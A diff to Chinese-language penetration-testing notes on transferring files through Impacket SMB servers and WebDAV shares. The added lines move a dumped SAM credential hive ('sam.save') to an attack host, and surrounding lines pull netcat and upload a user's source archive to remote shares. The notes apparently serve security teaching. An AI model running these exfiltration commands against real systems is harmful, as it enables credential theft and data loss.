@@ -44,6 +44,8 @@ sudo impacket-smbserver share -smb2support /tmp -user test -password test
 
 # 从 SMB 服务器复制文件
 copy \\192.168.220.133\share\nc.exe
+# 移动文件
+move sam.save \\192.168.220.133\
 # 使用用户名和密码挂载 SMB 服务器
 net use n: \\192.168.220.133\share /user:test test
 ```
@@ -96,6 +98,12 @@ dir \\192.168.49.128\DavWWWRoot
 # 上传文件
 copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
 copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
+
+# 攻击主机上 使用 Impacket 中的smbserver.py 创建 SMB 服务器
+sudo impacket-smbserver share -smb2support /tmp
+
+# 移动文件
+move sam.save \\<攻击主机 IP>\tmp
 ```
 
 `注意： DavWWWRoot是 Windows Shell 识别的特殊关键字。您的 WebDAV 服务器上不存在这样的文件夹。DavWWWRoot 关键字告诉 Mini-Redirector 驱动程序，该驱动程序处理您连接到 WebDAV 服务器根目录的 WebDAV 请求。如果您在连接到服务器时指定服务器上存在的文件夹，则可以避免使用此关键字。例如：\192.168.49.128\sharefolder`
